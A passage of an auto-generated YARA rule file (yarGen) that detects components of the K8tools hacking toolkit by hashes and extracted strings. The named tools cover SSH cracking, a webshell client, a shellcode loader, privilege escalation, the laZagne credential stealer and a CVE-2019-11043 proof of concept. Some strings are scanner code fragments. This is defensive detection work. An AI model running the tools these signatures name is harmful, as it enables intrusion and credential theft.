      $s9 = "ZbhfKD!yo#" fullword ascii /* score: '4.00'*/
      $s10 = "distutils.sysconfig(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s11 = "obKC?n:" fullword ascii /* score: '4.00'*/
      $s12 = "tsXrWkV" fullword ascii /* score: '4.00'*/
      $s13 = "oTcQ5Ad" fullword ascii /* score: '4.00'*/
      $s14 = "msVkw_-~" fullword ascii /* score: '4.00'*/
      $s15 = "_osx_support(" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s16 = "shutil(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s17 = "py_compile(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s18 = "distutils.log(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s19 = "tarfile(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s20 = "distutils.errors(" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _K8Cscan_Ladon_20 {
   meta:
      description = "K8tools - from files K8Cscan.py, Ladon.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "a99c94d2657feb0a534f009edb3f3af252dcd7861a45bad9e85fa3c486bff50f"
      hash2 = "e27c111f2d36c27f41b1dc1690dabee40d27d218d2ba76a6910352bf55da3678"
   strings:
      $s1 = "# test if target is vulnerable" fullword ascii /* score: '27.00'*/
      $s2 = "#print('Login failed: ' + nt_errors.ERROR_MESSAGES[e.error_code][0])" fullword ascii /* score: '22.00'*/
      $s3 = "conn.login(USERNAME, PASSWORD)" fullword ascii /* score: '22.00'*/
      $s4 = "# print('%s\\t%s'%(ip,getHostName(ip)))" fullword ascii /* score: '21.00'*/
      $s5 = "# print('%s\\t%s\\t%s'%(ip,getHostName(ip),SmbVul))" fullword ascii /* score: '21.00'*/
      $s6 = "# output = os.popen('ping -%s 1 %s'%(ptype,ip)).readlines()" fullword ascii /* score: '21.00'*/
      $s7 = "#Linux not support load 'netscan40.dll' (Maybe Mono is support)" fullword ascii /* score: '20.00'*/
      $s8 = "clr.FindAssembly('netscan40.dll')" fullword ascii /* score: '20.00'*/
      $s9 = "result = socket.gethostbyaddr(target)" fullword ascii /* score: '19.00'*/
      $s10 = "def getHostName(target):" fullword ascii /* score: '19.00'*/
      $s11 = "print('%s\\t%s\\t%s'%(ip,getHostName(ip)))" fullword ascii /* score: '17.00'*/
      $s12 = "if(os.path.exists('netscan40.dll')):" fullword ascii /* score: '17.00'*/
      $s13 = "if checkPort(target,'445'):" fullword ascii /* score: '17.00'*/
      $s14 = "print('load netscan40.dll')" fullword ascii /* score: '17.00'*/
      $s15 = "output = os.popen('ping -%s 1 %s'%(ptype,ip)).readlines()" fullword ascii /* score: '17.00'*/
      $s16 = "print('load netscan40.dll (.net >= 4.0)')" fullword ascii /* score: '17.00'*/
      $s17 = "MSRPC_UUID_NETLOGON = uuidtup_to_bin(('12345678-1234-ABCD-EF00-01234567CFFB','1.0'))" fullword ascii /* score: '15.00'*/
      $s18 = "conn = MYSMB(target)" fullword ascii /* score: '14.17'*/
      $s19 = "return socket.gethostbyname(socket.gethostname())" fullword ascii /* score: '14.00'*/
      $s20 = "#print('The target is not patched')" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0xbbef and filesize < 20KB and ( 8 of them )
      ) or ( all of them )
}

rule _ScRunBase32_sshcrack_ScRunBase64_scrun_sshcmd_smbcheck_21 {
   meta:
      description = "K8tools - from files ScRunBase32.exe, sshcrack.exe, ScRunBase64.exe, scrun.exe, sshcmd.exe, smbcheck.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "6973d802aef27a76a07067858ff47999e67ef02879786608bedc4f1b0508ac30"
      hash2 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
      hash3 = "de72bfa9415cda80d9ee956c784bea7760c72e041bbdbeefe2f6ad44ab920273"
      hash4 = "406fa2253f7568e45639a0e0391949d66637f412b91c0dab6eaad5b97d30c0b2"
      hash5 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
      hash6 = "767d4a583547d7d6da8fb5aa8602c33816908e90768a05696d311b497d57250b"
   strings:
      $s1 = "WL@LdLlL\\L" fullword ascii /* score: '9.00'*/
      $s2 = "cCCjrm8" fullword ascii /* score: '5.00'*/
      $s3 = "dk>f%k%f" fullword ascii /* score: '5.00'*/
      $s4 = "gq\"nr$YNUgMjb" fullword ascii /* score: '4.42'*/
      $s5 = "LKJZuus" fullword ascii /* score: '4.00'*/
      $s6 = "~uwgg?" fullword ascii /* score: '4.00'*/
      $s7 = "jvzPs,s?" fullword ascii /* score: '4.00'*/
      $s8 = "Finzth|m<2" fullword ascii /* score: '4.00'*/
      $s9 = "^b.toq" fullword ascii /* score: '4.00'*/
      $s10 = "KgzwQ?" fullword ascii /* score: '4.00'*/
      $s11 = "XwOi_7r" fullword ascii /* score: '4.00'*/
      $s12 = ".pEC;8" fullword ascii /* score: '4.00'*/
      $s13 = "hdZEY,??" fullword ascii /* score: '4.00'*/
      $s14 = "EPRfxd\\" fullword ascii /* score: '4.00'*/
      $s15 = "qhth42" fullword ascii /* score: '2.00'*/
      $s16 = "\\FJe0K" fullword ascii /* score: '2.00'*/
      $s17 = ": qJRgi" fullword ascii /* score: '1.00'*/
      $s18 = "G 7!?C$j" fullword ascii /* score: '1.00'*/
      $s19 = ";WH? V" fullword ascii /* score: '1.00'*/
      $s20 = "A@T<y3 =:<:" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 28000KB and ( 8 of them )
      ) or ( all of them )
}

rule _K8_________ASP_______________________________K8___________________________________________22 {
   meta:
      description = "K8tools - from files K8一句话ASP木马客户端加强程序版.exe, K8迅雷、快车、旋风地址互换工具.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "7b91ca796cadf146a90f642c28d25292ae9f1f5590d55adbe190dec77d5eb1a7"
      hash2 = "4097e04c7176bb6dd4c2ab8b49d73ee568de48ee864f76124f120be68bc304b0"
   strings:
      $s1 = "http://hi.baidu.com/qhack8" fullword wide /* score: '17.00'*/
      $s2 = "ddress" fullword ascii /* score: '5.00'*/
      $s3 = "DweY}z " fullword ascii /* score: '4.42'*/
      $s4 = "DEFAULT_ICON" fullword wide /* score: '4.00'*/
      $s5 = "LANGUAGE 4, " fullword ascii /* score: '4.00'*/
      $s6 = "KERNEL32.DL" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s7 = "WqKPBv=D" fullword ascii /* score: '4.00'*/
      $s8 = "CrAcK8_" fullword wide /* score: '4.00'*/
      $s9 = "}PROPBTYGJif !" fullword ascii /* score: '4.00'*/
      $s10 = "windowW" fullword ascii /* score: '4.00'*/
      $s11 = "//oGl.chs\\" fullword ascii /* score: '4.00'*/
      $s12 = "pdVV~<Os(" fullword ascii /* score: '4.00'*/
      $s13 = "QT\"Y%l-" fullword ascii /* score: '3.50'*/
      $s14 = "\\WV999" fullword ascii /* score: '2.00'*/
      $s15 = "\\tm|th" fullword ascii /* score: '2.00'*/
      $s16 = "\\ZZ5\"jh" fullword ascii /* score: '2.00'*/
      $s17 = "2 lHt.c" fullword ascii /* score: '1.00'*/
      $s18 = "2>^\" w" fullword ascii /* score: '1.00'*/
      $s19 = "t&V0r!" fullword ascii /* score: '1.00'*/
      $s20 = "BJY.8U" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _ScRunBase32_sshcrack_web_K8PortScan_ScRunBase64_scrun_sshcmd_23 {
   meta:
      description = "K8tools - from files ScRunBase32.exe, sshcrack.exe, web.exe, K8PortScan.exe, ScRunBase64.exe, scrun.exe, sshcmd.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "6973d802aef27a76a07067858ff47999e67ef02879786608bedc4f1b0508ac30"
      hash2 = "4a023e1b9ff0a1ac7df76764e708770eacc50a76efa38f7d339ecc0c72daccd9"
      hash3 = "480638e653075f5c4326a228dd34e83dbfbb296c03367e1a3157e08ddf907e35"
      hash4 = "43feb173eea41cddec443266f5abadccabe9fb02e47868f1d737ce4f2347690e"
      hash5 = "de72bfa9415cda80d9ee956c784bea7760c72e041bbdbeefe2f6ad44ab920273"
      hash6 = "406fa2253f7568e45639a0e0391949d66637f412b91c0dab6eaad5b97d30c0b2"
      hash7 = "4aa373d8f124c0f1143d6cb8e339e518a6fb058433aa46c1868900d093dc1dcd"
   strings:
      $s1 = "PyInstaller: FormatMessageW failed." fullword ascii /* score: '7.00'*/
      $s2 = "No error messages generated." fullword ascii /* score: '7.00'*/
      $s3 = "PyInstaller: pyi_win32_utils_to_utf8 failed." fullword ascii /* score: '7.00'*/
      $s4 = "7P7e7v7" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s5 = "3$313<3" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s6 = "8H8O8T8X8\\8`8" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s7 = "FhPt/h8*C" fullword ascii /* score: '4.00'*/
      $s8 = ";9;@;E;" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s9 = "0!0)01090W0_0" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s10 = "5)6F6V6" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s11 = "0.0p0~0" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s12 = "4>4]4|4" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s13 = "303<3X3x3" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s14 = "3,=4=<=D=L=T=\\=d=l=t=|=" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s15 = "4*4b4z4" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s16 = "5.5@5R5d5v5" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s17 = "7-7K7_7e7" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s18 = "7\"747A7S7[7e7n7" fullword ascii /* score: '1.42'*/
      $s19 = "4$4(4,40444@5D5H5L5P5T5X5\\5`5d5h5l5p5t5x5|5" fullword ascii /* score: '1.42'*/
      $s20 = "1<2B2G2M2^2B3" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 28000KB and pe.imphash() == "4df47bd79d7fe79953651a03293f0e8f" and ( 8 of them )
      ) or ( all of them )
}

rule _K8__________________V1_1_20121020_K_8__K8_ASP___________________24 {
   meta:
      description = "K8tools - from files K8手机远控电脑V1.1_20121020[K.8].rar, K8-ASP注入漏洞环境.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "d7a9681b2c65fa3bab3497915149d39fc354d3d86873725370f6f40c88971e72"
      hash2 = "c2566256323e093b0bfd49bedc7be370aa7cacaff097276ca1cedaa5ebac3d0e"
   strings:
      $s1 = "PLje{j>O" fullword ascii /* score: '4.00'*/
      $s2 = ".YXz/-" fullword ascii /* score: '4.00'*/
      $s3 = "\\Ar#1Y," fullword ascii /* score: '2.00'*/
      $s4 = "I(bNw " fullword ascii /* score: '1.42'*/
      $s5 = "aZgZk " fullword ascii /* score: '1.42'*/
      $s6 = "[@LG a" fullword ascii /* score: '1.00'*/
      $s7 = "7q,wl-" fullword ascii /* score: '1.00'*/
      $s8 = ":1]0(l" fullword ascii /* score: '1.00'*/
      $s9 = "N5gpLlRF" fullword ascii /* score: '1.00'*/
      $s10 = "8orTtK" fullword ascii /* score: '1.00'*/
      $s11 = "h$7['f" fullword ascii /* score: '1.00'*/
      $s12 = "A0)t\"\\" fullword ascii /* score: '1.00'*/
      $s13 = "OX@y?0" fullword ascii /* score: '1.00'*/
      $s14 = "K@qx\\dB" fullword ascii /* score: '1.00'*/
      $s15 = "Inkt:;" fullword ascii /* score: '1.00'*/
      $s16 = "pp~GB4" fullword ascii /* score: '1.00'*/
      $s17 = "^@#MO#" fullword ascii /* score: '1.00'*/
      $s18 = "Y/TT`u>^C" fullword ascii /* score: '1.00'*/
      $s19 = "o.xl%d" fullword ascii /* score: '1.00'*/
      $s20 = ">\"n:+\"@l" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x6152 and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _______6_0_2_614_______net2_0day_25 {
   meta:
      description = "K8tools - from files 卡巴6.0.2.614提权.exe, net2.0day.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "079763535b1dbde97a4366f587b2464923d8cd34796c5a8981447d852f73908d"
      hash2 = "479430dece7f6e344ec28377216a4a725c73534ad90e165c7070f79c34f147be"
   strings:
      $s1 = "flag == 0 || flag == 1" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s2 = "%ld bytes in %ld %hs Blocks." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s3 = "normal block at 0x%08X, %u bytes long." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s4 = "DAMAGE: on top of Free block at 0x%08X." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s5 = "Allocation too large or negative: %u bytes." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s6 = "_BLOCK_TYPE(pOldBlock->nBlockUse)==_BLOCK_TYPE(nBlockUse)" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s7 = "memory check error at 0x%08X = 0x%02X, should be 0x%02X." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s8 = "%hs located at 0x%08X is %u bytes long." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s9 = "Total allocations: %ld bytes." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s10 = "DAMAGE: before %hs block (#%d) at 0x%08X." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s11 = "Invalid allocation size: %u bytes." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s12 = "DAMAGE: after %hs block (#%d) at 0x%08X." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s13 = "crt block at 0x%08X, subtype %x, %u bytes long." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s14 = "Bad memory block found at 0x%08X." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s15 = "Largest number used: %ld bytes." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s16 = "client block at 0x%08X, subtype %x, %u bytes long." fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s17 = "_sftbuf.c" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s18 = "ch != _T('\\0')" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s19 = "pOldBlock->nLine == IGNORE_LINE && pOldBlock->lRequest == IGNORE_REQ" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s20 = "_BLOCK_TYPE_IS_VALID(pHead->nBlockUse)" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _K8PortScan_Suse10_x64_K8PortScan_Kali_x86_26 {
   meta:
      description = "K8tools - from files K8PortScan_Suse10_x64, K8PortScan_Kali_x86"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "b9df9b1eafdcc6c6440d4d924ac09262e736c94d22601722c7994bf12031f4a6"
      hash2 = "0c15a74440d9fee10428f2b1882099586437ce460473bd71c4cacc5d108cbfe4"
   strings:
      $s1 = "Cannot dlsym for PyImport_ExecCodeModule" fullword ascii /* score: '15.00'*/
      $s2 = "_IO_stdin_used" fullword ascii /* score: '7.00'*/
      $s3 = ".note.ABI-tag" fullword ascii /* score: '7.00'*/
      $s4 = ".eh_frame_hdr" fullword ascii /* score: '7.00'*/
      $s5 = "Cannot dlsym for PyDict_GetItemString" fullword ascii /* score: '5.00'*/
      $s6 = "Cannot dlsym for PyModule_GetDict" fullword ascii /* score: '5.00'*/
      $s7 = "inflate" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.82'*/ /* Goodware String - occured 177 times */
      $s8 = "__libc_start_main" fullword ascii /* score: '4.00'*/
      $s9 = "__gmon_start__" fullword ascii /* score: '4.00'*/
      $s10 = "blibpython2.7.so.1.0" fullword ascii /* score: '4.00'*/
      $s11 = "libz.so.1" fullword ascii /* score: '4.00'*/
      $s12 = "libc.so.6" fullword ascii /* score: '4.00'*/
      $s13 = "blibz.so.1" fullword ascii /* score: '4.00'*/
      $s14 = "libdl.so.2" fullword ascii /* score: '4.00'*/
      $s15 = "Cannot dlsym for PyRun_SimpleString" fullword ascii /* score: '3.00'*/
      $s16 = "Cannot dlsym for PyImport_ImportModule" fullword ascii /* score: '3.00'*/
      $s17 = "Cannot dlsym for PyImport_AddModule" fullword ascii /* score: '3.00'*/
      $s18 = "8O8)9x" fullword ascii /* score: '1.00'*/
      $s19 = "w<p<t<r<v<q<u<s<w" fullword ascii /* score: '1.00'*/
      $s20 = "__xstat" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 15000KB and ( 8 of them )
      ) or ( all of them )
}

rule _iislpe_k8_SSH_Manage_k8vncpwd_K8shellcodeLoader_K8domainVBS_27 {
   meta:
      description = "K8tools - from files iislpe.exe, k8_SSH_Manage.exe, k8vncpwd.exe, K8shellcodeLoader.exe, K8domainVBS.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "73b9cf0e64be1c05a70a9f98b0de4925e62160e557f72c75c67c1b8922799fc4"
      hash2 = "6755adf9b2ef8ac901c669fb6836f9e6352b5be8e74841c77950b434f82f6ab9"
      hash3 = "a8547c4d903cf5262dfb2524824bdb0127b0977f4a1135dca2116e18de51aa1b"
      hash4 = "d2fca9cf9ce146e0a4a3e5581b24de36a29b984377bd60630fa157fd9aae41cb"
      hash5 = "258525c2e1679c80d1e357bb2628a43f0549b8af553a65006300fec6c0c456ea"
   strings:
      $s1 = "B|BxBtBpBlBhBdB`B\\BXBTBPBLBHBDB@B<B8B4B0B,B(B$B B" fullword wide /* score: '4.00'*/
      $s2 = "T$h9T$" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s3 = "ForceRemove" fullword ascii /* PEStudio Blacklist: strings */ /* score: '3.83'*/ /* Goodware String - occured 1167 times */
      $s4 = "NoRemove" fullword ascii /* PEStudio Blacklist: strings */ /* score: '3.83'*/ /* Goodware String - occured 1170 times */
      $s5 = "FL9~Xu" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s6 = "t.9Vlt)" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s7 = ";l$TsY)l$T" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s8 = "L$4;D$Ts<)D$T" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s9 = "Oh;O\\sN" fullword ascii /* score: '1.00'*/
      $s10 = "v$;540B" fullword ascii /* score: '1.00'*/
      $s11 = "uL9=\\9B" fullword ascii /* score: '1.00'*/
      $s12 = "t$H;t$8" fullword ascii /* score: '1.00'*/
      $s13 = "t*9Qlu%" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s14 = "t:<wuE" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _CVE_2019_11043_POC_Ladon5_7_28 {
   meta:
      description = "K8tools - from files CVE-2019-11043-POC.rar, Ladon5.7.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "e0ac305b7421eefeb38d8125d533c25513fc92c13523e08391088b032763eab6"
      hash2 = "a9428836bdd0a967f0a9da1e38ddf7309a1ae6352a46d3f60e34a3d9788453ce"
   strings:
      $s1 = "exe=F:\\Python279\\python.exe" fullword ascii /* score: '21.17'*/
      $s2 = "CVE-2019-11043_POC.ini" fullword ascii /* score: '8.00'*/
      $s3 = "CVE-2019-11043-POC.PNG" fullword ascii /* score: '8.00'*/
      $s4 = "arg=CVE-2019-11043-POC.py $ip$" fullword ascii /* score: '5.00'*/
      $s5 = "CVE-2019-11043-POC.py" fullword ascii /* score: '5.00'*/
      $s6 = "hSeq>f_" fullword ascii /* score: '4.00'*/
      $s7 = "khrdK\"" fullword ascii /* score: '4.00'*/
      $s8 = "pS}}_ " fullword ascii /* score: '1.42'*/
      $s9 = "wgltPl" fullword ascii /* score: '1.00'*/
      $s10 = "(aQ3Pm" fullword ascii /* score: '1.00'*/
      $s11 = "XaK%#;'" fullword ascii /* score: '1.00'*/
      $s12 = "W>+uWY" fullword ascii /* score: '1.00'*/
      $s13 = "f[Ladon]" fullword ascii /* score: '1.00'*/
      $s14 = "3RnK]R" fullword ascii /* score: '1.00'*/
      $s15 = "=8oHeYz" fullword ascii /* score: '1.00'*/
      $s16 = "0IR/3~" fullword ascii /* score: '1.00'*/
      $s17 = "3Ebtf/i" fullword ascii /* score: '1.00'*/
      $s18 = "G5]\"Ll," fullword ascii /* score: '1.00'*/
      $s19 = "v|#&_IU" fullword ascii /* score: '1.00'*/
      $s20 = "C=WZ-f%" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x6152 and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _K8weblogic_WPdetection_K8_FileHideImg_K8____________________________k8_SSH_Manage_K8shellcodeLoader_K8________________K8____29 {
   meta:
      description = "K8tools - from files K8weblogic.exe, WPdetection.exe, K8_FileHideImg.exe, K8文件夹个性设置工具.exe, k8_SSH_Manage.exe, K8shellcodeLoader.exe, K8注册表跳转.exe, K8一句话ASP木马客户端加强程序版.exe, K8domainVBS.exe, k8cmd.exe, K8_JbossExp.exe, K8PortMap.exe, UPX加壳脱壳.exe, K8随机免杀花指令生成器V2.0.exe, VNCdoor.exe, K8迅雷、快车、旋风地址互换工具.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "520c7663266cf2016f83bd14d096cf4d3ee2c1ef0a6a1c136f2ae3c7281e920e"
      hash2 = "a7812be575c83daf208722fa4bc577b7223bf3de42bb572635146bb24a2dfa09"
      hash3 = "e36ff95d82b4954806bc1b0d9763851b06342ec248dde8855cef3d4d9df547d4"
      hash4 = "86429eba2156c16011ae99f7097ac17182ef4d7bdabc6bc76661f87ec4b2d986"
      hash5 = "6755adf9b2ef8ac901c669fb6836f9e6352b5be8e74841c77950b434f82f6ab9"
      hash6 = "d2fca9cf9ce146e0a4a3e5581b24de36a29b984377bd60630fa157fd9aae41cb"
      hash7 = "79287d5264d81bc40b9474faf0cce368e300eaf7efe0ddfea6e74f3b2321c930"
      hash8 = "7b91ca796cadf146a90f642c28d25292ae9f1f5590d55adbe190dec77d5eb1a7"
      hash9 = "258525c2e1679c80d1e357bb2628a43f0549b8af553a65006300fec6c0c456ea"
      hash10 = "b5a08c30adbdea4976ac07f346b8f8af13486aed913854dcd7c0c2a97f441315"
      hash11 = "4536d7d187e1dfe67ec0b568af318d63d88a1828be07900138b438d7cd4dea51"
      hash12 = "ab54a346f9ab48b983583d14ff7f616789f4cf471c51ae216008488fc426c653"
      hash13 = "352112d9dc2e35ccc2ebeb7babea6e9fdd54622bc959ed0e6f83bb27d62784ed"
      hash14 = "06d1764eb0c4bdbd8a9c768cfdb2a78097df6d8d94a116db3295a7e290cc163e"
      hash15 = "c9b90f412b6f3b4ec2a374c98d319c8f63218264b7b895796ccb542e17b5b00b"
      hash16 = "4097e04c7176bb6dd4c2ab8b49d73ee568de48ee864f76124f120be68bc304b0"
   strings:
      $s1 = "hgpagpagpaLgGAq7N" fullword ascii /* score: '4.00'*/
      $s2 = "+It9>U'\"2" fullword ascii /* score: '1.00'*/
      $s3 = "[&w'*k%O" fullword ascii /* score: '1.00'*/
      $s4 = "+5Q&$:" fullword ascii /* score: '1.00'*/
      $s5 = ",G#9b+#" fullword ascii /* score: '1.00'*/
      $s6 = "0L&E{;$" fullword ascii /* score: '1.00'*/
      $s7 = "+9b+0L&#4" fullword ascii /* score: '1.00'*/
      $s8 = "+Q{;6T)" fullword ascii /* score: '1.00'*/
      $s9 = ",It9D_'Nn" fullword ascii /* score: '1.00'*/
      $s10 = "+K)=r8$" fullword ascii /* score: '1.00'*/
      $s11 = ":8M(\"2" fullword ascii /* score: '1.00'*/
      $s12 = "+K)=r8#" fullword ascii /* score: '1.00'*/
      $s13 = ",Q{;2M(9[" fullword ascii /* score: '1.00'*/
      $s14 = "+It90L&" fullword ascii /* score: '1.00'*/
      $s15 = ")X~*Mn+D_'>U'D_'D_'D_'>U'8B'8B'4D#.G" fullword ascii /* score: '1.00'*/
      $s16 = "{A{3.V" fullword ascii /* score: '1.00'*/
      $s17 = ":2M()<" fullword ascii /* score: '1.00'*/
      $s18 = "i*k%7h" fullword ascii /* score: '1.00'*/
      $s19 = ",It96T)Eg" fullword ascii /* score: '1.00'*/
      $s20 = "+Hl45Q&*;" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _UPX_____________K8______________________________V2_0_30 {
   meta:
      description = "K8tools - from files UPX加壳脱壳.exe, K8随机免杀花指令生成器V2.0.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "352112d9dc2e35ccc2ebeb7babea6e9fdd54622bc959ed0e6f83bb27d62784ed"
      hash2 = "06d1764eb0c4bdbd8a9c768cfdb2a78097df6d8d94a116db3295a7e290cc163e"
   strings:
      $s1 = "g%s_%d" fullword ascii /* score: '5.00'*/
      $s2 = "IcqIs" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s3 = "ByWl'Word" fullword ascii /* score: '4.00'*/
      $s4 = "&Disabl" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s5 = "kFreeSp" fullword ascii /* score: '4.00'*/
      $s6 = "clMaroonG" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s7 = "HIFTJIS" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s8 = "Close!" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s9 = "lyTznsp" fullword ascii /* score: '4.00'*/
      $s10 = "Ft?Htb" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s11 = "1234567890ABC" ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s12 = "Safecal" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s13 = "ZTUWVS" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s14 = "\\_WARN" fullword ascii /* score: '2.00'*/
      $s15 = "2 Mik2" fullword ascii /* score: '1.00'*/
      $s16 = "?  t.<" fullword ascii /* score: '1.00'*/
      $s17 = "|$TMulR" fullword ascii /* score: '1.00'*/
      $s18 = "N:Q?cJ\\" fullword ascii /* score: '1.00'*/
      $s19 = "aTq;S|}" fullword ascii /* score: '1.00'*/
      $s20 = "BX[U{}x" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _laZagne_K8PortScan_K8PortScan_Kali_x86_31 {
   meta:
      description = "K8tools - from files laZagne.exe, K8PortScan.exe, K8PortScan_Kali_x86"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1f58bef31a99631a59437a93db2307a3f84b83221829a9851f355e401c74f0e6"
      hash2 = "43feb173eea41cddec443266f5abadccabe9fb02e47868f1d737ce4f2347690e"
      hash3 = "0c15a74440d9fee10428f2b1882099586437ce460473bd71c4cacc5d108cbfe4"
   strings:
      $s1 = "DDYFKu(" fullword ascii /* score: '4.00'*/
      $s2 = "\"y1:= , " fullword ascii /* score: '1.42'*/
      $s3 = "r}>RX,{XLX-T" fullword ascii /* score: '1.00'*/
      $s4 = "$5E\\Yn^" fullword ascii /* score: '1.00'*/
      $s5 = "b'uyo8" fullword ascii /* score: '1.00'*/
      $s6 = "Hp,HyGz" fullword ascii /* score: '1.00'*/
      $s7 = "vcm9z3D" fullword ascii /* score: '1.00'*/
      $s8 = ">y\">Y9" fullword ascii /* score: '1.00'*/
      $s9 = "N{mEOW:" fullword ascii /* score: '1.00'*/
      $s10 = "#=cl;{" fullword ascii /* score: '1.00'*/
      $s11 = "2yl[0h" fullword ascii /* score: '1.00'*/
      $s12 = "~rdft*d" fullword ascii /* score: '1.00'*/
